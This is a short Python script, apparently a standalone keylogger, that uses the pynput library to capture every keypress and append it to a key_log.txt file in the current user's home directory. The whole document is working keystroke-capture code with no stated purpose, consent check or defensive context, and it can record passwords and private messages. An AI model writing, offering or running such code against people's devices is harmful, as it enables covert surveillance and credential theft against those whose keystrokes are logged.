from pynput import keyboard
import os

# Dynamically get the current user's home directory and add log file name
log_file = os.path.join(os.path.expanduser("~"), "key_log.txt")

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

